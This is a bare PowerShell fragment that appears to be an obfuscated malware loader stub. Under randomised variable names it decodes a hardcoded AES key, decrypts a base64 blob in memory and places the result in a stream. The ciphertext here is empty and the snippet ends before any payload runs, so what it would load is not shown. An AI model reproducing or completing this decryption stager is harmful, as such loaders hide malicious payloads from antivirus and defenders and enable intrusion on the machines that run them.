$shijw = [System.Convert]::FromBase64String("")
$npytbw = [System.Convert]::FromBase64String("xeEa7HtAN6IOKIxf8Ae/xb0VtrGDz5+McDvFDS/hCGY=")
$demqo = New-Object "System.Security.Cryptography.AesManaged"
$demqo.Mode = [System.Security.Cryptography.CipherMode]::CBC
$demqo.IV = $shijw[0..15]
$demqo.KeySize = 128
$demqo.Key = $npytbw
$demqo.BlockSize = 128
$demqo.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
$izyge = New-Object System.IO.MemoryStream(,$demqo.CreateDecryptor().TransformFinalBlock($shijw,16,$shijw.Length-16))
